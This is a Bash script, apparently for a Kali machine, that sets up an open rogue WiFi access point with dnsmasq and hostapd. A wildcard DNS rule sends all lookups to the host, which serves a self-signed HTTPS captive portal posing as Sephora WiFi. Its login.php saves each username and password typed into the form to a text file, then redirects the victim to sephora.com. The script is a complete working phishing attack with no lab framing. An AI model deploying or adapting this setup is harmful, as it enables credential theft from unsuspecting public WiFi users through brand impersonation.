#!/bin/bash

# Variables
WIFI_IFACE="wlan0"
ETH_IFACE="eth0"
WIFI_IP="192.168.1.1"
NETMASK="255.255.255.0"
DHCP_RANGE_START="192.168.1.100"
DHCP_RANGE_END="192.168.1.200"
DHCP_LEASE_TIME="12h"

echo "🚀 Setting up WiFi Access Point..."

# 1 Bring up the WiFi interface with a static IP
echo "🔹 Configuring $WIFI_IFACE with static IP..."
ip link set $WIFI_IFACE up
ip addr flush dev $WIFI_IFACE
ip addr add $WIFI_IP/24 dev $WIFI_IFACE  # Keeping /24 for simplicity

# 2 Enable IP forwarding for internet sharing
echo "🔹 Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward
sed -i 's/^#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/' /etc/sysctl.conf
sysctl -p

# 3 Set up iptables rules for NAT
echo "🔹 Configuring iptables rules for NAT..."
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -t nat -A POSTROUTING -o $ETH_IFACE -j MASQUERADE
iptables -A FORWARD -i $WIFI_IFACE -o $ETH_IFACE -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $ETH_IFACE -o $WIFI_IFACE -j ACCEPT

# Ensure iptables rules persist after reboot (better method)
apt install -y iptables-persistent
iptables-save > /etc/iptables/rules.v4

# 4 Configure dnsmasq (DHCP + DNS)
echo "🔹 Configuring dnsmasq..."
cat > /etc/dnsmasq.conf <<EOL
interface=$WIFI_IFACE
listen-address=$WIFI_IP
bind-interfaces
address=/#/192.168.1.1
dhcp-range=$DHCP_RANGE_START,$DHCP_RANGE_END,$DHCP_LEASE_TIME
server=8.8.8.8
server=8.8.4.4
log-queries
log-dhcp
EOL

# Restart dnsmasq
systemctl restart dnsmasq

# 5 Configure hostapd (WiFi AP)
echo "🔹 Configuring hostapd..."
cat > /etc/hostapd/hostapd.conf <<EOL
interface=$WIFI_IFACE
driver=nl80211
ssid=MyAccessPoint
hw_mode=g
channel=7
wpa=0
EOL

# Ensure hostapd uses this config
sed -i 's|^#DAEMON_CONF=.*|DAEMON_CONF="/etc/hostapd/hostapd.conf"|' /etc/default/hostapd

echo "[+] Génération du certificat SSL auto-signé..."
openssl req -newkey rsa:2048 -nodes -keyout /etc/ssl/private/captive.key -x509 -days 365 -out /etc/ssl/certs/captive.crt -subj "/C=FR/ST=Paris/L=Paris/O=WiFi Public/CN=sephoraWifi.com"

echo "[+] Configuration du portail captif..."
mkdir -p /var/www/html/
cat <<EOF > /var/www/html/index.html
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion WiFi</title>
</head>
<body>
    <h2>Authentification WiFi</h2>
    <form action="login.php" method="POST">
        <input type="text" name="username" placeholder="Nom d'utilisateur" required><br>
        <input type="password" name="password" placeholder="Mot de passe" required><br>
        <input type="submit" value="Connexion">
    </form>
</body>
</html>
EOF

cat <<EOF > /var/www/html/hotspot-detect.html
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion WiFi</title>
</head>
<body>
    <h2>Authentification WiFi</h2>
    <form action="login.php" method="POST">
        <input type="text" name="username" placeholder="Nom d'utilisateur" required><br>
        <input type="password" name="password" placeholder="Mot de passe" required><br>
        <input type="submit" value="Connexion">
    </form>
</body>
</html>
EOF
cat <<EOF > /var/www/html/login.php
<?php
// Capture the credentials and append them to a log file
$username = isset($_POST['username']) ? $_POST['username'] : 'N/A';
$password = isset($_POST['password']) ? $_POST['password'] : 'N/A';

// Sanitize the inputs to prevent injection attacks
$clean_username = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
$clean_password = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');

// Log the sanitized credentials
file_put_contents("/var/www/html/logins.txt", "$clean_username : $clean_password\n", FILE_APPEND);

// Redirect to Sephora
header("Location: https://www.sephora.com");
exit();
?>
EOF

echo "[+] Configuration Apache pour HTTPS..."
a2enmod ssl
cat <<EOF > /etc/apache2/sites-available/captive.conf
<VirtualHost *:443>
    ServerAdmin admin@sephoraWifi.com
    DocumentRoot /var/www/html
    ServerName sephoraWifi.com

    SSLEngine on
    SSLCertificateFile /etc/ssl/certs/captive.crt
    SSLCertificateKeyFile /etc/ssl/private/captive.key

    <Directory /var/www/html/>
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog \${APACHE_LOG_DIR}/error.log
    CustomLog \${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
EOF

a2ensite captive

echo "[+] Activation de la redirection HTTP -> HTTPS..."
cat <<EOF > /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
    ServerName sephoraWifi.com
    Redirect permanent / https://sephoraWifi.com/
</VirtualHost>
EOF

cat <<EOF > /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
192.168.1.1   sephoraWifi.com

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
EOF

echo "[+] Redémarrage des services Apache..."
systemctl restart apache2

echo "[+] Configuration des règles iptables..."
#iptables --flush
#iptables --table nat --flush
#iptables --delete-chain
#iptables --table nat --delete-chain
#iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80
#iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 443
#echo 1 > /proc/sys/net/ipv4/ip_forward


# Enable and restart hostapd
systemctl unmask hostapd
systemctl enable hostapd
systemctl restart hostapd

# 6 Enable services at boot
echo "🔹 Enabling services at boot..."
systemctl enable dnsmasq
systemctl enable hostapd 

# Restart NetworkManager to apply changes
echo "🔹 Restarting NetworkManager..."
systemctl restart NetworkManager

echo "✅ WiFi Access Point setup complete! 🚀"
